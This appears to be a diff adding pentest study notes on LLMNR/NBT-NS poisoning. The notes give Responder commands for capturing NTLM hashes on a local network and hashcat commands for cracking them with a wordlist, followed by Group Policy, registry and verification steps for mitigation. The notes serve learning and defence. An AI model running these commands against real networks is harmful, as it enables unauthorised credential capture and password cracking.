@@ -1,0 +1,75 @@
+
+LLMNR is a protocol that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local network without requiring a DNS server or DNS configuration.
+
+When a host’s DNS query fails (i.e., the DNS server doesn’t know the name) the host broadcasts an LLMNR request on the local network to see if any other host can answer.
+
+LLMNR is the successor to NetBIOS. NetBIOS (Network Basic Input/Output System) is an older protocol that was heavily used in early versions of Windows networking. NBT-NS is a component of NetBIOS over TCP/IP (NBT) and is responsible for name registration and resolution. Like LLMNR, NBT-NS is a fallback protocol when DNS resolution fails. It allows local name resolution within a LAN.
+
+
+-- Responder --
+
+sudo responder --help
+
+sudo responder -I eth0 -rdw
+sudo responder -I eth0 -rdw -v
+
+sudo responder -I eth0 -dwP
+sudo responder -I eth0 -dwPv
+
+
+-- Hashcat --
+
+hashcat --help | grep NTLM
+
+hashcat -m 5600 ntlmhash.txt rockyou.txt
+hashcat -m 5600 ntlmhash.txt rockyou.txt -O
+hashcat -m 5600 ntlmhash.txt rockyou.txt --show
+hashcat -m 5600 ntlmhash.txt rockyou.txt --force
+
+C:\ hashcat64.exe -m 5600 ntlmhash.txt rockyou.txt -O
+
+hashcat –m 5600 ntlmhash.txt rockyou.txt
+
+
+
+-- LLMNR Poisoning be Mitigation --
+
+- Main Defense – Disable LLMNR and NBT-NS -
+
+To disable LLMNR, select “Turn OFF Multicast Name Resolution” under Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor.
+
+To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select “Disable NetBIOS over TCP/IP”.  This only works locally.
+
+
+To disable NBT-NS via GPO, we can simply write a PowerShell script (see below) and save it in Startup Scripts.
+
+set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces\tcpip* -Name NetbiosOptions -Value 2
+
+Now add the script to Startup Scripts in Computer Configuration > Policies > Windows Settings > Scripts > Startup
+
+
+-- Confirming Mitigation --
+
+We can confirm that we have mitigated LLMNR by running the following command in PowerShell and receiving a ‘0’ in return.
+
+$(Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" -name EnableMulticast).EnableMulticast
+
+
+We can confirm that we have mitigated NBT-NS by running the following command in cmd.exe and receiving a ‘2’ in return
+
+wmic nicconfig get caption,index,TcpipNetbiosOptions
+
+
+-- Alternate Defenses --
+
+· Require Network Access Control.
+· Require strong user passwords (e.g., >14 characters in length and limit common word usage).  The more complex and longer the password, the harder it is for an attacker to crack the hash.
+
+
+
+
+https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/
+
+
+
+
